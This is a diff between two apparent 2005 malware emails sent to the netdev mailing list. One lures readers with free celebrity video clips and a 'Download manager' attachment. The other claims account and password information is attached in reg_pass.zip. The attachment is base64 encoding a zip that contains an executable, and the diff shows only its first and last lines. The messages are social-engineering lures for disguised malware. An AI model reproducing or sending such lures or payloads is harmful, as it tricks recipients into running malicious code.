@@ -1,30 +1,29 @@
-From: hostmaster@xos.nl
-Subject: Paris Hilton & Nicole Richie
-Date: Mon, 19 Dec 2005 06:51:38 UTC
-Message-ID: <1bde5c9dac3db09f@xos.nl>
+From: hostmaster@intransa.com
+Subject: Your Password
+Date: Mon, 19 Dec 2005 06:54:48 UTC
+Message-ID: <5b7a.96a7abccac7d@intransa.com>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=2b69b36cd044"
+Content-Type: multipart/mixed; boundary="====6e5546c.d03b16dbe"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: address@oss.sgi.com
+To: mailserver@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=2b69b36cd044
+--====6e5546c.d03b16dbe
 
-The Simple Life:
+Account and Password Information are attached!
 
-View Paris Hilton & Nicole Richie video clips , pictures & more ;)
-Download is free until Jan, 2006!
 
-Please use our Download manager.
---=2b69b36cd044
-Content-Type: application/octet-stream; name=downloadm.zip
+***** Go to: http://www.intransa.com
+***** Email: postman@intransa.com
+--====6e5546c.d03b16dbe
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="downloadm.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1001,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=2b69b36cd044--
+--====6e5546c.d03b16dbe--
